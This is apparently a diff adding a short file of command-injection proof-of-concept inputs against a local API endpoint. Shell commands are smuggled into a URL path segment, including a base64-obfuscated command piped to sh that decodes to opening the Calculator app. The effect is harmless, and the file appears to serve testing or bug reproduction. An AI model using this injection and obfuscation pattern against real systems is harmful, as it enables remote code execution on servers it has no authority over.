@@ -1,0 +1,15 @@
+http://localhost:7070/api/users/';ls;'
+
+
+
+http://localhost:7070/api/users/';echo "b3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwCg==" | base64 -D | sh
+;'
+
+
+➜  ~ base64
+open /Applications/Calculator.app
+b3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwCg==
+
+
+echo "b3BlbiAvQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwCg==" | base64 -D | sh
+
